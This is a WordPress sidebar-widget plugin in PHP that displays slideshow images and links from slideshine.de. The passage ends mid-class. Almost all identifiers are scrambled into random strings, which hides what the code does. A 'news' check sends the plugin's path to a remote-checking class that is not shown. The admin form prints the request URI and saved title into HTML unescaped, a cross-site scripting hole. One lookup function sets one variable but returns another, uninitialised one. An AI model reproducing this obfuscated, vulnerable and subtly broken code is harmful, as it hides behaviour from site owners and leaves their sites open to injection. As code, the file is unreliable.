<?php
/*
Plugin Name: Fractal-Explorer
Plugin URI: http://web-fractals.sf.net/project.php
Description: Sidebar widget for the presentation and visualization of colored julia and mandelbrot fractals. Animated zoom realized as GIF animation is used to dive into and explore the internal structure of fractals.
Version: 0.6.0
Author: carlos26
Author URI: http://web-fractals.sf.net/author.php
*/

# @date 2010-09-02 14-45-11
     abstract class Aipqrywpawzjhdds {
   const Fqqxceixueka = 'options';
  const Wuepyutsvhls = 'submit';
 const Aqkkycfrlgql = 'title';
    const Kocfmbtchrrfjuk = 'count';
         const Vgcjisncmmc = 'mode';
  const Qvgysrdcvzhtlj = 'lang';
     const Zdjiivbekepyco = 'compids';
     const Hoxuffnnnphz = 0;
   const Ksqrccaczr = 1;
     const Ejdrgndtcge = 2;		
      const Zcfqazmko = 'backend-title';
       const Vaptmsunis = 'backend-count';
const Dhdpyosgvlj = 'backend-compids';
         const Eckemsndchrve = 'backend-mode';
      const Jgxqgtzfrl = 'backend-lang';
      const Xozenvfaay = 'backend-head';
         const Srhzskvtboexp = 'backend-foot';
      const Avmvqtcqki = 'backend-news';
 const Hpphxnzynjsbmig = 'backend-info';
        const Wjesxjzxwabzv = 101;
     const Bosdeikpqg = 102;
      const Evmvpjkivdp = 103;
        const Rltsbyrbvqtlh = 104;
       const Dqeyohzofcys = 105;
      const Wuruopbnkea = 106;
      const Wnmsffkdtmo = 107;
        const Nzjeabhvvfktd = 108;
       const Hvzcrhpccmfz = 109;
       const Mjypbufcimrx = 110;
        const Egimkjgmfsyiz = 111;
       const Ftolmudlzmzh = 113;
        const Nrabgonlvhksg = 112;
     const Ynuywgvnne = 120;
   const Ckrtdmzrsw = 0;
       const Efrweycxxuqjif = 1;
       const Tszytkuihlliqc = 2;
     const Opsusdbimzuu = 3;
    const Kikvxdaojho = 4;
 public function constructDcvoowwesuaz($sllmrvokpctyz, $dtiuruwvwjzi, $fjgcgpxftdxu, $fuqolesbyfe) {
   $options = get_option($this->constructQjckfhcbrah(self::Fqqxceixueka));
         $title = $options['title'];
      $compids = $this->getPokdvrjgudwg($options['compids'], $options['count']);
       $mode = $options['mode'];
       $lang = $options['lang'];
   $karma_data = Iflixgxadeecilcb::getInstance()->createGszghumcuusvuhnkl($compids);
$translator = new Brxxdktgeelb($lang);
         $renderer = $this->constructNrfxhwfvggaplhakxs($translator, $mode);
  echo $sllmrvokpctyz;
     echo $fjgcgpxftdxu . $title . $fuqolesbyfe;
        echo $renderer->queryEstpueuvnmz($karma_data);
 echo $dtiuruwvwjzi;
   }
 public function getAmalrjteidlkxzyk() {
      $options = $this->createIuwjfxhnkegxwfxxp();
         $title = $options['title'];
 $translator = new Brxxdktgeelb($options['lang']);
         echo '<p>' . $translator->createLfeeoxwuhgynnzr('backend.widgets.control.redirection', array(Brxxdktgeelb::Seotaqzqyg => $this->buildVrdlqqitfs())) . '</p>';
       echo '<input type="hidden" id="' . $this->constructQjckfhcbrah(self::Wuepyutsvhls) . '" name="' . $this->constructQjckfhcbrah(self::Wuepyutsvhls) . '" value="1" />';
   }
     public function createIuwjfxhnkegxwfxxp() {
         $translator = new Brxxdktgeelb($this->constructMrwwwjxzyujxesho());
    $compids = explode(',', $this->setWnpdzmdreahpwg());
shuffle($compids);
     $compids = array_slice(
     $compids, 0, 
      min(
 $this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Nrabgonlvhksg),
       count($compids)
   )
    );
         for($arrWniuhtjrzy = 0; $arrWniuhtjrzy < count($compids); $arrWniuhtjrzy++) {
$compids[$arrWniuhtjrzy] = trim($compids[$arrWniuhtjrzy]);
   }
         $options = array(
    'title'=>$translator->createLfeeoxwuhgynnzr('frontend.title'),
       'compids'=>implode(', ', $compids),
        'mode'=>self::Ejdrgndtcge,
     'lang'=>$this->constructMrwwwjxzyujxesho(),
        'count'=>$this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Ftolmudlzmzh)
    );
$opts = get_option($this->constructQjckfhcbrah(self::Fqqxceixueka));
  if (!empty($opts)) {
     foreach ($opts as $key=>$value) {
      $options[$key] = $value;
   }
   }
     update_option($this->constructQjckfhcbrah(self::Fqqxceixueka), $options);
        return $options;
   }
public function setQuaxujoacgczjqm() {
     $result = '';
      $options = $this->createIuwjfxhnkegxwfxxp();
 $translator = new Brxxdktgeelb($options['lang']);
     if ( $_POST[$this->constructQjckfhcbrah(self::Wuepyutsvhls)] !== null ) {
      $valid = true;
     if ($this->queryPrsthdtzkmhbv(self::Wjesxjzxwabzv)) {
        $options['title'] = $_POST[$this->constructQjckfhcbrah(self::Aqkkycfrlgql)];
   }
  if ($this->queryPrsthdtzkmhbv(self::Bosdeikpqg)) {
      if (
     preg_match('/^\s*[0-9]+\s*$/', $_POST[$this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk)]) &&
(int) $_POST[$this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk)] >= $this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Mjypbufcimrx) &&
        (int) $_POST[$this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk)] <= $this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Egimkjgmfsyiz)
     ) {
 $options['count'] = $_POST[$this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk)];
} else {
    $result .= '
   <div class="updated">
      <p><strong>' . $translator->createLfeeoxwuhgynnzr('backend.validation.count') . '</strong></p>
        </div>
    ';
   }
   }
     if ($this->queryPrsthdtzkmhbv(self::Rltsbyrbvqtlh)) {
      $options['mode'] = $_POST[$this->constructQjckfhcbrah(self::Vgcjisncmmc)];
   }
    if ($this->queryPrsthdtzkmhbv(self::Dqeyohzofcys)) {
         $options['lang'] = $_POST[$this->constructQjckfhcbrah(self::Qvgysrdcvzhtlj)];
   $translator->constructMhvrdxcrgo($options['lang']);
   }
   if ($this->queryPrsthdtzkmhbv(self::Evmvpjkivdp)) {
 if (preg_match('/^\s*([0-9]+,\s*)*[0-9]+\s*$/', $_POST[$this->constructQjckfhcbrah(self::Zdjiivbekepyco)])) {
  $options['compids'] = $_POST[$this->constructQjckfhcbrah(self::Zdjiivbekepyco)];
} else {
    $result .= '
   <div class="updated">
        <p><strong>' . $translator->createLfeeoxwuhgynnzr('backend.validation.compids') . '</strong></p>
        </div>
    ';
   }
   }
   if ($result === '') {
    $result .= '
   <div class="updated">
       <p><strong>' . $translator->createLfeeoxwuhgynnzr('backend.updated') . '</strong></p>
        </div>
    ';
     update_option($this->constructQjckfhcbrah(self::Fqqxceixueka), $options);
   }
   }
         $title = $options['title'];
         $count = $options['count'];
   $compids = $options['compids'];
       $mode = $options['mode'];
       $lang = $options['lang'];
 $infoButton = '<span class="' . $this->createNhecvmwfrclphxpqjhr(self::Hpphxnzynjsbmig) . '" onclick="document.getElementsByName(\'' . $this->createNhecvmwfrclphxpqjhr(self::Srhzskvtboexp) . '\')[0].style.display=\'block\'; return false;">?</span>';
    $result .= '
 <div class="wrap"> 
      <form name="form1" method="post" action="' . $_SERVER['REQUEST_URI'] . '">
  <h2>' . $translator->createLfeeoxwuhgynnzr('backend.title', array(Brxxdktgeelb::Seotaqzqyg => $this->buildVrdlqqitfs())) . '</h2> 
    ';
   if ($this->queryPrsthdtzkmhbv(self::Wuruopbnkea)) {
    $result .= '
        <div class="' . $this->createNhecvmwfrclphxpqjhr(self::Xozenvfaay) . '">' . 
 $translator->createLfeeoxwuhgynnzr('backend.manual.top') . 
         '</div>
        <br />
    ';
   }
     if ($this->queryPrsthdtzkmhbv(self::Wjesxjzxwabzv)) {
    $result .= '
      <!-- title -->
 <p class="' . $this->createNhecvmwfrclphxpqjhr(self::Zcfqazmko) . '">
 <label for="' . $this->constructQjckfhcbrah(self::Aqkkycfrlgql) . '">
      <b>' . $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.title') . '</b>:<br />
       <span>' . $translator->createLfeeoxwuhgynnzr('backend.manual.title') . '</span><br />
      <input id="' . $this->constructQjckfhcbrah(self::Aqkkycfrlgql) . '" name="' . $this->constructQjckfhcbrah(self::Aqkkycfrlgql) . '" type="text" value="'.$title.'" />
</label>
      </p>
    ';
   }
  if ($this->queryPrsthdtzkmhbv(self::Bosdeikpqg)) {
    $result .= '
      <!-- count -->
  <p class="' . $this->createNhecvmwfrclphxpqjhr(self::Vaptmsunis) . '">
    <label for="' . $this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk) . '">
      <b>' . $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.count') . '</b>:<br />
       <span>' . $translator->createLfeeoxwuhgynnzr('backend.manual.count') . '</span><br />
  <input id="' . $this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk) . '" name="' . $this->constructQjckfhcbrah(self::Kocfmbtchrrfjuk) . '" type="text" value="'.$count.'" />
</label>
      </p>
    ';
   }
   if ($this->queryPrsthdtzkmhbv(self::Evmvpjkivdp)) {
    $result .= '
        <!-- compids -->
   <p class="' . $this->createNhecvmwfrclphxpqjhr(self::Dhdpyosgvlj) . '">
   <label for="' . $this->constructQjckfhcbrah(self::Zdjiivbekepyco) . '">
        <b>' . $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.compids') . '</b>:<br />
     <span>' . $translator->createLfeeoxwuhgynnzr('backend.manual.compids', array(Brxxdktgeelb::Fbecdcpsaqx => $this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Nzjeabhvvfktd))) . '</span><br />
  <input id="' . $this->constructQjckfhcbrah(self::Zdjiivbekepyco) . '" name="' . $this->constructQjckfhcbrah(self::Zdjiivbekepyco) . '" type="text" value="'.$compids.'" />
</label>
      </p>
    ';
   }
     if ($this->queryPrsthdtzkmhbv(self::Rltsbyrbvqtlh)) {
    $result .= '
     <!-- mode -->
     <p class="' . $this->createNhecvmwfrclphxpqjhr(self::Eckemsndchrve) . '">
<label for="' . $this->constructQjckfhcbrah(self::Vgcjisncmmc) . '">
     <b>' . $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.mode') . '</b>:<br />
      <span>' . $translator->createLfeeoxwuhgynnzr('backend.manual.mode') . '</span><br />
  <select id="' . $this->constructQjckfhcbrah(self::Vgcjisncmmc) . '" name="' . $this->constructQjckfhcbrah(self::Vgcjisncmmc) . '">
       ' . $this->constructKgxnhjcozcesgzr(self::Hoxuffnnnphz, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.image-mode'), $mode) . '
         ' . $this->constructKgxnhjcozcesgzr(self::Ksqrccaczr, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.animation-mode'), $mode) . '
      ' . $this->constructKgxnhjcozcesgzr(self::Ejdrgndtcge, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.image-animation-mode'), $mode) . '
 </select>
</label>
      </p>
    ';
   }
    if ($this->queryPrsthdtzkmhbv(self::Dqeyohzofcys)) {
    $result .= '
     <!-- lang -->
  <p class="' . $this->createNhecvmwfrclphxpqjhr(self::Jgxqgtzfrl) . '">
   <label for="' . $this->constructQjckfhcbrah(self::Qvgysrdcvzhtlj) . '">
         <b>' . $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.language') . '</b>:<br />
<span>' . $translator->createLfeeoxwuhgynnzr('backend.manual.language') . '</span><br />
        <select id="' . $this->constructQjckfhcbrah(self::Qvgysrdcvzhtlj) . '" name="' . $this->constructQjckfhcbrah(self::Qvgysrdcvzhtlj) . '">
' . $this->constructKgxnhjcozcesgzr($this->constructMrwwwjxzyujxesho(), $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.default'), $lang) . '
         ' . $this->constructKgxnhjcozcesgzr(Brxxdktgeelb::Qwthkhajp, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.english'), $lang) . '
  ' . $this->constructKgxnhjcozcesgzr(Brxxdktgeelb::Boipofhjxenbu, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.german'), $lang) . '
' . $this->constructKgxnhjcozcesgzr(Brxxdktgeelb::Ckaiuxtlpf, $translator->createLfeeoxwuhgynnzr('backend.fieldlabel.spanish'), $lang) . '
 </select>
</label>
      </p>
    ';
   }
   if ($this->queryPrsthdtzkmhbv(self::Wnmsffkdtmo)) {
    $result .= '
 ' . $infoButton . '
      <div name="' . $this->createNhecvmwfrclphxpqjhr(self::Srhzskvtboexp) . '" class="' . $this->createNhecvmwfrclphxpqjhr(self::Srhzskvtboexp) . '">
     ' . $translator->createLfeeoxwuhgynnzr('backend.manual.bottom')
   ;
    if ($this->queryPrsthdtzkmhbv(self::Hvzcrhpccmfz)) {
   $result .= 
        '<div class="' . $this->createNhecvmwfrclphxpqjhr(self::Avmvqtcqki) . '">' .
         $this->setAhlqmxnkrcjx($translator) .
 '</div>';
   }
    $result .= '
        </div>
    ';
   }
    $result .= '
    <!-- update switch -->
   <input type="hidden" id="' . $this->constructQjckfhcbrah(self::Wuepyutsvhls) . '" name="' . $this->constructQjckfhcbrah(self::Wuepyutsvhls) . '" value="1" />				
  <div class="submit">
    <input type="submit" name="submit" value="' . $translator->createLfeeoxwuhgynnzr('backend.save') . ' &raquo;" />
        </div>
         </form>
        </div>
    ';
     echo $result;
   }
      protected function constructKgxnhjcozcesgzr($uxehyptwclym, $nczfscynn, $telugsexy) {
  $selected = ($telugsexy == $uxehyptwclym ? 'selected' : '');
     return '<option value="' . $uxehyptwclym . '" ' . $selected . '>' . $nczfscynn . '</option>';
   }
protected function constructMrwwwjxzyujxesho() {
        $Bzrurhpas = get_locale();
$Bzrurhpas = substr($Bzrurhpas, 0, 2);
   switch ($Bzrurhpas) {
 case Brxxdktgeelb::Qwthkhajp:
     case Brxxdktgeelb::Boipofhjxenbu:
  case Brxxdktgeelb::Ckaiuxtlpf:
        break;
default:
         $Bzrurhpas = Brxxdktgeelb::Qwthkhajp;
        break;
   }
return $Bzrurhpas;
   }
   public function queryYmltzxibockplyow() {
echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->queryPnbrxvauprxl() . '/style.css" type="text/css" media="screen" />';
   }
   public function setRwnyzihldfuyrrlsgo() {
 echo '<link rel="stylesheet" href="' . WP_PLUGIN_URL . '/' . $this->queryPnbrxvauprxl() . '/style2.css" type="text/css" media="screen" />';
   }
        public function setAhlqmxnkrcjx($ukxnrtojfq) {
     $result = '';
$nc = $this->queryLhjesctwwmdacwehz();
   $pluginName = $this->queryPnbrxvauprxl();
      $transKey = 'news://plugins/' . $pluginName;
       if (	false === ( $json = get_transient($transKey) ) && 
    !preg_match('/localhost/', get_option('siteurl')) &&
 !preg_match('/127.0.0.1/', get_option('siteurl'))
     ) {
   $msgs = $nc->constructSouwcpuzsmmyjsskdl(
     $pluginName, 
    WP_PLUGIN_DIR . '/' . $pluginName . '/' . $pluginName . '.php'
    );
$json = @json_encode($msgs);
         $isTransientSet = set_transient($transKey, $json, 1*24*60*60 + mt_rand(0, 3*24*60*60));
   }
       if ($json == null || $json == '') {
         return;
   }
      $msgs = @json_decode($json, true);
       if (count($msgs) > 0 && $msgs[Cqemhspqs::Albsnpgvcnk] === true) {
  $result .= $ukxnrtojfq->createLfeeoxwuhgynnzr('backend.news.upgrade');
   }
       return $result;
   }
    protected function getPokdvrjgudwg($hapcnkuw, $obvpjcjgctjx) {
        $hapcnkuw = explode(',', $hapcnkuw);
    $rotationMode = $this->queryPrsthdtzkmhbv(Aipqrywpawzjhdds::Ynuywgvnne);
      switch ($rotationMode) {
         case 0:
 shuffle($hapcnkuw);
        break;
         case 1:
     $hapcnkuw = $this->buildUyahiqqikqqqifs($hapcnkuw, $this->setPorrfzbkdgfaalbqkm());
        break;
         case 2:
         $dateid = round(time() / (60*60*24));
  $hapcnkuw = $this->buildUyahiqqikqqqifs($hapcnkuw, $dateid);
        break;
         case 3:
$combinedid = $this->setPorrfzbkdgfaalbqkm() + ( round(time() / (60*60*24)) );
      $hapcnkuw = $this->buildUyahiqqikqqqifs($hapcnkuw, $combinedid);
        break;
         case 4:
default:
        break;
   }
     $hapcnkuw = array_slice($hapcnkuw, 0, $obvpjcjgctjx);
 for ($arrUrbmwvryrv = 0; $arrUrbmwvryrv < count($hapcnkuw); $arrUrbmwvryrv++) {
  $hapcnkuw[$arrUrbmwvryrv] = trim($hapcnkuw[$arrUrbmwvryrv]);
   }
         return $hapcnkuw;
   }
    private function setPorrfzbkdgfaalbqkm() {
       return round(crc32($_SERVER['REQUEST_URI']));
   }
        private function buildUyahiqqikqqqifs($yjnhszgwclr, $iljiquhftv) {
$intBrstifkngex = count($yjnhszgwclr);
if ($intBrstifkngex === 0) {
  return $yjnhszgwclr;
   }
   for ($isGerqmhkaxwhm = 0; $isGerqmhkaxwhm < $intBrstifkngex; $isGerqmhkaxwhm++) {
       $pos = ($intBrstifkngex + $isGerqmhkaxwhm + $iljiquhftv) % $intBrstifkngex;
    $reorderedArr[$isGerqmhkaxwhm] = $yjnhszgwclr[$pos];
   }
   return $reorderedArr;
   }
     public abstract function buildVrdlqqitfs();
       public abstract function queryPnbrxvauprxl();
  public abstract function constructQjckfhcbrah($seevzurxmqf);
        public abstract function createNhecvmwfrclphxpqjhr($utbnbrgzlnxx);
 public abstract function constructNrfxhwfvggaplhakxs($ropvkhmugpl, $eksgbulom);
  public abstract function queryLhjesctwwmdacwehz();
       public abstract function queryPrsthdtzkmhbv($pkscywpy);
       public abstract function setWnpdzmdreahpwg();
   }
         class Stezkdzcocsj extends Qsroogcfsuuxaiwahl {
     public function queryEstpueuvnmz(&$tiyubezsekuuarh) {
     $ropvkhmugpl = $this->tbikqbmrxu;
  $eksgbulom = $this->eleqpaaub;
     $html = '<div class="' . $this->createNhecvmwfrclphxpqjhr(self::Ohdwuoeqzk) . '">';
         foreach ($tiyubezsekuuarh as $data) {
  $html .= '
        <div class="' . $this->createNhecvmwfrclphxpqjhr(self::Lnautvfvsjvqzg) . '">
        <a href="' . $data['slideshowUrl'] . '" target="_blank">
        ' . $this->createMmvjjfonusonkqwb($data, $eksgbulom) . '
      </a>
        </div>
    ';
   }
$html .= '</div>';
     return $html;
   }
        public function createNhecvmwfrclphxpqjhr($xctwnzadvc) {
    return 'fracexp-' . $xctwnzadvc;
   }
   }
         class Cbxbdwnqgcsvem extends Aipqrywpawzjhdds {
       const Junnliwusbeigyk = '
    21780, 21759, 21738, 21721, 23303, 24256, 26645, 27147, 27273, 28217, 28680, 29042
    ';
   public function __construct() {
   }
       public function buildVrdlqqitfs() {
       return 'FractalExplorer';
   }
         public function queryPnbrxvauprxl() {
        return 'fractal-explorer';
   }
     public function constructQjckfhcbrah($anwgmzmjgjyf) {
    return 'fractalexplorer-' . $anwgmzmjgjyf;
   }
public function createNhecvmwfrclphxpqjhr($ljgmorscrdhh) {
      return 'fracexp-' . $ljgmorscrdhh;
   }
         public function constructNrfxhwfvggaplhakxs($thwwrmongxhzc, $jxuwrseiwoeso) {
   $renderer = new Stezkdzcocsj($thwwrmongxhzc, $jxuwrseiwoeso);
         return $renderer;
   }
    public function queryLhjesctwwmdacwehz() {
   $nc = Cqemhspqs::getInstance();
   return $nc;
   }
public function queryPrsthdtzkmhbv($xckkgjmhn) {
        $result = false;
   switch ($xckkgjmhn) {
        case Aipqrywpawzjhdds::Mjypbufcimrx:
    $result = 1;
        break;
         case Aipqrywpawzjhdds::Egimkjgmfsyiz:
  $arrAursqimdbcc = 2;
        break;
        case Aipqrywpawzjhdds::Ftolmudlzmzh:
  $arrAursqimdbcc = 1;
        break;
         case Aipqrywpawzjhdds::Nrabgonlvhksg:
  $arrAursqimdbcc = 5;
        break;
      case Aipqrywpawzjhdds::Ynuywgvnne:
 $arrAursqimdbcc = Aipqrywpawzjhdds::Opsusdbimzuu;
        break;
       case Aipqrywpawzjhdds::Wuruopbnkea:
        case Aipqrywpawzjhdds::Dqeyohzofcys:
      $arrAursqimdbcc = false;
        break;
         case Aipqrywpawzjhdds::Nzjeabhvvfktd:
      $arrAursqimdbcc = array(
        'Fractals' => 'http://slideshine.de/categories/tags.php/Fraktale',
      'Digital Art' => 'http://slideshine.de/categories/tags.php/Digital%20Art',
     'Slideshow of the day' => 'http://slideshine.de/categories/tags.php/Slideshow%20des%20Tages',
      'Slideshow of the week' => 'http://slideshine.de/categories/tags.php/Slideshow%20der%20Woche',
    'Best of' => 'http://slideshine.de/categories/tags.php/Best%20of%20slideshine.de',
         'I\'m Feeling Lucky' => 'http://slideshine.de/index.php?page=Posts.RandomSlideshow&cat=Fraktale',
    'more ...' => 'http://slideshine.de/categories/tags.php/Alle',
    );
        break;
        case Aipqrywpawzjhdds::Hvzcrhpccmfz:
     $arrAursqimdbcc = true;
        break;
default:
     $arrAursqimdbcc = true;
        break;
   }
     return $arrAursqimdbcc;
   }
         public function setWnpdzmdreahpwg() {
 return self::Junnliwusbeigyk;
   }
   }
  class Brxxdktgeelb {
     const Qwthkhajp = 'en';
         const Boipofhjxenbu = 'de';
      const Ckaiuxtlpf = 'es';
  const Seotaqzqyg = 'widgetId';
const Fbecdcpsaqx = 'links';
 private $nlnzwncco;
   public function __construct($nklfgjpiumun = null) {
$this->nlnzwncco = ($nklfgjpiumun === null ? self::Qwthkhajp : $nklfgjpiumun);
   }
   public function createLfeeoxwuhgynnzr($vuggrscbyqx, $czyisfjf = null) {
    $en = array(
        'frontend.author' => 'by',
'frontend.slideshows' => 'Slideshows',
  'frontend.images' => 'Images',
      'frontend.comments' => 'Comments',
'frontend.karma' => 'Karma',
    'frontend.title' => 'My images',
         'backend.validation.compids' => 'Slideshow-IDs invalid.',
   'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
   'backend.updated' => 'Settings updated.',
     'backend.title' => '' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ' Options',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->constructGemubbdyharxcza($czyisfjf[Brxxdktgeelb::Fbecdcpsaqx]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
       'backend.save' => 'Save',
'backend.fieldlabel.title' => 'Title',
 'backend.fieldlabel.count' => 'Number of images',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
        'backend.fieldlabel.mode' => 'Mode',
      'backend.fieldlabel.language' => 'Language',
        'backend.fieldlabel.default' => '(automatic)',
    'backend.fieldlabel.english' => 'english',
  'backend.fieldlabel.german' => 'german',
    'backend.fieldlabel.spanish' => 'spanish',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
   'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
    'backend.widgets.control.redirection' => 'Please go to [Admin Menu] -> [Settings] -> [' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ']',
    );
    $de = array(
         'frontend.author' => 'von',
'frontend.slideshows' => 'Slideshows',
  'frontend.images' => 'Bilder',
        'frontend.comments' => 'Kommentare',
'frontend.karma' => 'Karma',
       'frontend.title' => 'Meine Bilder',
 'backend.validation.compids' => 'Slideshow-IDs ungültig.',
        'backend.validation.count' => 'Anzahl von Bildern ungültig (d.h. keine Ganzzahl, zu klein or zu groß).',
  'backend.updated' => 'Einstellungen gespeichert.',
 'backend.title' => '' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ' Einstellungen',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->constructGemubbdyharxcza($czyisfjf[Brxxdktgeelb::Fbecdcpsaqx]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
  'backend.save' => 'Speichern',
'backend.fieldlabel.title' => 'Titel',
   'backend.fieldlabel.count' => 'Anzahl von Bildern',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
         'backend.fieldlabel.mode' => 'Modus',
     'backend.fieldlabel.language' => 'Sprache',
'backend.fieldlabel.default' => '(automatisch)',
     'backend.fieldlabel.english' => 'englisch',
   'backend.fieldlabel.german' => 'deutsch',
     'backend.fieldlabel.spanish' => 'spanisch',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
   'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
       'backend.widgets.control.redirection' => 'Siehe [Admin Menu] -> [Settings] -> [' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ']',
    );
    $es = array(
        'frontend.author' => 'de',
'frontend.slideshows' => 'Slideshows',
    'frontend.images' => 'Imagenes',
         'frontend.comments' => 'Comentarios',
'frontend.karma' => 'Karma',
   'frontend.title' => 'Imagenes',
    'backend.validation.compids' => 'Slideshow-IDs están nulos.',
   'backend.validation.count' => 'Number of images invalid (i.e. not an integer, too low or too high).',
     'backend.updated' => 'Opciones guardadas.',
      'backend.title' => '' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ' Opciones',
        'backend.manual' => 'Configuration',
 'backend.manual.top' => 'Configuration of <ul style="list-style-type: square; padding-left: 15px;"><li>widget title</li><li>Slideshow-IDs</li><li>View</li><li>Language</li></ul>',
        'backend.manual.bottom' => 'Server requests are cached by default. Therefore when a slideshow is displayed for the first time, the widget will need a few seconds to retrieve the data from the server. Then however it will load the data from the internal cache and widget will be rendered faster.',
  'backend.manual.title' => 'Your title for this widget as it will be displayed at the top of the widget in the sidebar.',
'backend.manual.count' => 'This value determines how many images will be displayed in this sidebar widget.',
         'backend.manual.compids' => 'Comma-separated list of Slideshow-IDs which is used to select a slideshow randomly and to display its images as GIF-animation. If a slideshow has the URL http://www.slideshine.de/12345, then its ID is 12345. By default some slideshows already are specified. Please replace this list with IDs of your favourite slideshows, which you can find and/or create here:<br>' . $this->constructGemubbdyharxcza($czyisfjf[Brxxdktgeelb::Fbecdcpsaqx]),
'backend.manual.mode' => 'Select display mode.',
     'backend.manual.language' => 'Select your language.',
        'backend.save' => 'Guardar Cambios',
  'backend.fieldlabel.title' => 'Título',
   'backend.fieldlabel.count' => 'Imagenes',
'backend.fieldlabel.compids' => 'Slideshow-IDs',
        'backend.fieldlabel.mode' => 'Modo',
    'backend.fieldlabel.language' => 'Lingua',
'backend.fieldlabel.default' => '(automático)',
   'backend.fieldlabel.english' => 'ingles',
   'backend.fieldlabel.german' => 'alemán',
     'backend.fieldlabel.spanish' => 'español',
'backend.fieldlabel.image-mode' => 'Image only',
  'backend.fieldlabel.animation-mode' => 'GIF-Animation only',
    'backend.fieldlabel.image-animation-mode' => 'Image and GIF-Animation (onmouseover effect)',
   'backend.news.upgrade' => 'To keep this plugin up-to-date, please check for new versions.',
 'backend.widgets.control.redirection' => '[Admin Menu] -> [Settings] -> [' . $czyisfjf[Brxxdktgeelb::Seotaqzqyg] . ']',
    );
       $strGxcfvnuampbe = array(
     self::Qwthkhajp => $en,
         self::Boipofhjxenbu => $de,
     self::Ckaiuxtlpf => $es
    );
        return $strGxcfvnuampbe[$this->nlnzwncco][$vuggrscbyqx];
   }
 public function constructMhvrdxcrgo($fxkwsxrlb) {
  $this->nlnzwncco = $fxkwsxrlb;
   }
 private function constructGemubbdyharxcza($fhtjdgaowhgcs) {
  if ($fhtjdgaowhgcs === null) {
         return;
   }
         $limitFfsmsuxcuv = array();
      foreach ($fhtjdgaowhgcs as $key => $value) {
        $limitFfsmsuxcuv[] .= '<a href="' . $value . '">' . $key . '</a>';
   }
       return implode(' &bull; ', $limitFfsmsuxcuv);
   }
   }
       abstract class Qsroogcfsuuxaiwahl {
     const Hoxuffnnnphz = 0;
   const Ksqrccaczr = 1;
    const Ejdrgndtcge = 2;
   const Ohdwuoeqzk = 'container';
     const Lnautvfvsjvqzg = 'element';
 const Ilbyeolkduyq = 'karma';
       const Vtiekpxybyibntw = 'karmabar';
 const Vplacghbwjpv = 'karmabar-filled';
    const Lnrtdkoqsyysuf = 'karmabar-default';
const Dfmawajvwabab = 'img';
        const Lgebmbiqg = 'title';
      const Syyhzpojypdvcrjh = 'author';
const Ihkltklokwx = 'stats';
    const Geaowvnvkhwfmpnc = 'list';
      const Nqpvxlqqgiug = 'slideshows';
   const Oaukvqdlheqcr = 'images';
     const Qfwbdhgqzoanj = 'comments';
 protected $tbikqbmrxu = null;
protected $eleqpaaub = null;
   public function __construct($ofwmdacyp, $pyqzmgvgkq = null) {
